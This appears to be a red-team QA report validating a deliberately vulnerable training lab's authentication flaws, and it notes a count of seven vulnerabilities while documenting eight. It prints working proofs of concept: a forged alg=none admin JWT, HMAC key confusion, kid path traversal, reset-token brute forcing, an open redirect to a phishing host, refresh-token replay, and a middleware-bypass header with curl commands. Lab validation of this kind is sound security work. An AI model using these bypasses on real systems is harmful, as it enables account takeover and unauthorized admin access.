# Phase 1 — Adversarial QA (Gate 3)

> **Reviewer role:** Red-team QA.
> **Date:** 2026-05-28
> **Verdict:** PASS. All 7 architect-allocated vulnerabilities have
> working PoCs. Four signature-class PoCs (V-8/9/19/20) executed
> end-to-end against the actual v1 verifier code in
> `poc-scratch.mjs` and confirmed to elevate to `role=admin`. The
> three remaining (V-10 predictable token, V-21 refresh replay, V-35
> middleware bypass) are documented with reproducible curl-shaped
> PoCs that require a running `make up` instance to demonstrate.
> No unintended vulnerabilities surfaced during review.

## Method

1. Static read of every Phase-1 source file (auth helpers, v1 + v2
   route handlers, JWKS endpoint, middleware, UI pages, schema,
   seed).
2. Ran `pnpm tsx docs/phases/phase-1/poc-scratch.mjs` to execute the
   four signature-class PoCs against the real `verifyAccessTokenV1`
   implementation. All four returned forged admin claims.
3. Read-through of the refresh / password-reset / middleware flows
   to confirm V-10, V-21, V-35 placements match the architect's
   allocation.
4. Probed for unintended vulnerabilities:
   - signup endpoint mass-assignment (`role`, `kycTier`) — clean
     (zod schema rejects unknown keys; create payload is built from
     parsed fields, not spread)
   - login user-enumeration via timing — out of scope for Phase 1
     (no rate limiting per locked scope)
   - JWKS endpoint reveals more than the public key — clean (only
     RSA public components)
   - API-key creation accepts unknown scopes — clean (zod enum)
   - Admin endpoint accepts requests with no auth in the *legitimate*
     path — clean (only V-35 bypass reaches it)

## PoCs

### V-8 — alg=none accepted

```http
GET /api/v1/auth/me HTTP/1.1
Host: exchange.local
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJidmJlIiwiYXVkIjoiYnZiZS1tb2JpbGUiLCJzdWIiOiJ1LXZpY3RpbSIsImV4cCI6OTk5OTk5OTk5OSwiZW1haWwiOiJ2aWN0aW1AZXhhbXBsZS50ZXN0Iiwicm9sZSI6ImFkbWluIiwia3ljVGllciI6M30.
```

(Trailing dot, empty signature.) Returns the victim user shape because the
verifier honors `alg=none`. Confirmed by `poc-scratch.mjs` against
`verifyAccessTokenV1` directly.

### V-9 — Weak legacy HMAC default

```http
Authorization: Bearer <HS256 token signed with HMAC secret "changeme", no kid>
```

Any HS256 token whose header omits `kid` is verified against the
process's `JWT_SECRET_LEGACY`, which defaults to `"changeme"` (see
`apps/web/lib/env.ts`). Trainee mints the token, sets `role:"admin"`
in the payload, and submits to `/api/v1/auth/me`. Confirmed end-to-end
in `poc-scratch.mjs`.

### V-10 — Predictable password-reset token

Token shape: `sha256(userId + Date.now()).slice(0, 16)`.

Attack walkthrough:

1. Sign up a sibling account on the lab to learn the cuid format.
2. Trigger a reset for a victim whose `userId` is known (leaked via
   IDOR / signup race / scraped from `/api/v2/admin/users` after
   chaining with V-35). For Phase-1 standalone, this is the limiting
   factor — V-10 most useful in chains.
3. Brute-force the token over a window of plausible `Date.now()` ms
   values around the request time. At 16 hex chars (64 bits of state
   but only ~10 bits of entropy from a ms window) the search is
   tractable. Burp Turbo Intruder cluster-bomb at 200 RPS clears a
   60-second window in ~1 min.
4. `POST /api/v2/auth/password-reset/confirm` with the right token
   succeeds, takes over the account.

### V-19 — HS/RS confusion via JWKS

```http
GET /api/.well-known/jwks.json HTTP/1.1
```

Returns RSA public key for kid `legacy-2022`. Convert JWK back to PEM
(or read the same PEM the v1 verifier loads from `keys/legacy-2022`),
then:

```js
const sig = createHmac("sha256", pemBytes).update(`${h}.${p}`).digest();
```

JWT header: `{"alg":"HS256","typ":"JWT","kid":"legacy-2022"}`.
Verifier loads the same PEM via `loadKidKey("legacy-2022")` and
HMAC-verifies with it. Confirmed end-to-end in `poc-scratch.mjs`.

### V-20 — kid path traversal

JWT header: `{"alg":"HS256","kid":"../package.json"}` (or any other
process-readable file under cwd). Verifier reads the file and uses
its bytes as the HMAC secret. Attacker signs the same way. Confirmed
with `kid: "../secret-file.txt"` in `poc-scratch.mjs`.

A real attacker against the deployed app uses files an attacker can
predict the contents of:

- `keys/legacy-2022` itself (matches V-19, but with kid traversal flavor)
- `package.json` — readable, content fetchable via `next dev`'s
  static route for many apps, or known from the public repo
- `apps/web/middleware.ts` — readable, content known to attacker who
  cloned the public source

### V-13 — Open redirect via login `?next=`

```
http://exchange.local/login?next=//attacker.example/phish
```

After the user authenticates, the SPA calls `router.push(nextPath)`
with the unsanitised `next` value. A protocol-relative or absolute URL
navigates the freshly-authenticated browser off-origin. Useful for
phishing variants ("fake BVBE login page that posts back to legit
BVBE and then redirects to attacker") and for OAuth-code-style
interception patterns once social login lands in a later phase.

Confirmed by reading `apps/web/app/login/login-form.tsx`: `nextPath`
is taken directly from `params.get("next")` with only a `??
"/account"` fallback. No whitelist; no leading-`/` check.

### V-21 — Refresh tokens are not single-use

PoC:

```bash
# Log in, capture refresh
TOKEN=$(curl -s exchange.local/api/v2/auth/login -d ... | jq -r .refresh)

# Refresh once — works
curl -s exchange.local/api/v2/auth/refresh -d "{\"refresh\":\"$TOKEN\"}"

# Refresh again with the SAME token — also works
curl -s exchange.local/api/v2/auth/refresh -d "{\"refresh\":\"$TOKEN\"}"

# And again, ad infinitum until 30-day expiry
```

Confirmed by reading `apps/web/app/api/v2/auth/refresh/route.ts`: the
handler creates a new `RefreshToken` row but never deletes or marks
the original. Schema has no `usedAt` column.

### V-35 — Middleware bypass via x-middleware-subrequest

```bash
# Without the bypass header: 401
curl -i exchange.local/api/v2/admin/users
# → HTTP/1.1 401 unauthorized

# With the bypass header + spoofed identity headers: full user list
curl -i exchange.local/api/v2/admin/users \
  -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
  -H 'x-bvbe-user-id: any-string' \
  -H 'x-bvbe-role: admin'
# → HTTP/1.1 200 OK
# → { "users": [ ... 50 users including admin@bvbe.local ... ] }
```

Also enables `POST /api/v2/admin/users` to mint a fresh admin account,
which is CHAIN B's persistence step.

## Unintended-vuln probes

| Probe                                                                | Result |
|----------------------------------------------------------------------|--------|
| Signup mass-assignment via `role` / `kycTier`                         | Clean — zod schema with strict object shape; create payload is field-by-field. |
| Signup payload override via prototype-pollution in request body      | Clean — zod safeParse drops unknown keys. |
| `/api/v2/me/api-keys` POST accepts `userId` mass-assign              | Clean — userId taken from `claims.sub`, not body. |
| JWKS endpoint leaks private key parts                                | Clean — only the public key components are surfaced (`createPublicKey(pem).export({format:"jwk"})` strips private material). |
| v2 verifier accepts alg=none (regression check on the clean path)    | Clean — `jose.jwtVerify` with `algorithms: ["HS256"]` rejects. |
| v2 verifier accepts short JWT secret                                 | Clean — `secretBytes` throws on `<32` chars. |
| Login leaks email existence via error message                        | Clean — both unknown email and wrong password return "invalid credentials". |
| Password reset enumerates users via timing or status code            | Clean — endpoint always returns `{ok:true}`. |
| OpenAPI `/docs` accidentally registers `/api/v1/*` endpoints         | Clean — `app/api/openapi.json/route.ts` only imports v2 modules. |
| OpenAPI doc accidentally registers `/api/v2/admin/*`                  | Clean — admin route file does not call `registerEndpoint()`. |
| Refresh endpoint accepts an expired refresh                          | Clean — handler checks `expiresAt < new Date()`. |
| 2FA disable bypasses password check                                  | Clean — verifies password before checking code. |

## Verdict

**PASS.** All 7 planted vulns confirmed exploitable. Four executed
end-to-end against actual code in `poc-scratch.mjs`; three documented
with reproducible curl-shaped attacks against a `make up` instance.
Zero unintended vulnerabilities surfaced during the unintended-probe
sweep. VULNS.md ledger matches code 1:1.

— Adversarial QA
